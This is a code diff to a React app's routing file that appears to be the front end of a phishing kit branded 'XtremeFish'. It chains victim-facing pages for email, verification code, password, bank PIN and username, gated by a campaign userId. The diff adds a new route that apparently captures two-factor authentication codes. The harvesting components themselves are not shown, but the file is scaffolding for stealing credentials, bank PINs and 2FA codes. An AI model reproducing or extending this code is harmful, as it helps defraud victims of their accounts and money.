@@ -6,7 +6,8 @@ import Code from "./components/flow.jsx/Code";
 import "./App.css";
 import "./index.css";
 import BankPin from "./components/flow.jsx/BankPin";
-import { Routes, Route, useSearchParams } from "react-router-dom";
+import AuthCode from "./components/flow.jsx/AuthCode";
+import { useSearchParams, Routes, Route } from "react-router-dom";
 import mongoose from "mongoose";
 
 function App() {
@@ -18,7 +19,7 @@ function App() {
   const [searchParams] = useSearchParams();
   const userId = searchParams.get("userId"); // Extracting userId from query parameters
   useEffect(() => {
-    setId(userId)
+    setId(userId);
     if (userId && mongoose.Types.ObjectId.isValid(userId)) {
       setValidUserId(true);
     }
@@ -39,13 +40,9 @@ function App() {
                 />
               }
             />
-            <Route 
-              path="/code" 
-              element={<Code 
-              emailValue={email} 
-              userId={userId} 
-            />
-              } 
+            <Route
+              path="/code"
+              element={<Code emailValue={email} userId={userId} />}
             />
             <Route
               path="/password"
@@ -58,18 +55,18 @@ function App() {
                 />
               }
             />
-            <Route 
-              path="/bankpin" 
-              element={<BankPin 
-              email={email} 
-              userId={userId} 
-            />
-              } 
-            />
             <Route
-              path="/username"
+              path="/bankpin"
+              element={<BankPin email={email} userId={userId} />}
+            />
+
+            <Route path="/authcode" element={<AuthCode email={email} />} />
+            <Route
+              path="/username/:userId?/*"
               element={
                 <Username
+                  username={username}
+                  setUsername={setUsername}
                   userId={userId}
                 />
               }
@@ -82,7 +79,8 @@ function App() {
             <div className="bg-[#0b111a] w-[500px] px-10 py-10 rounded-md flex flex-col justify-center items-center gap-4 text-center">
               <p className="text-red-500">Access Restricted!</p>
               <p className="text-white text-sm">
-                Please return to XtremeFish and follow the correct link to access this page.
+                Please return to XtremeFish and follow the correct link to
+                access this page.
               </p>
               <a
                 href="http://localhost:3000/dashboards/urls"
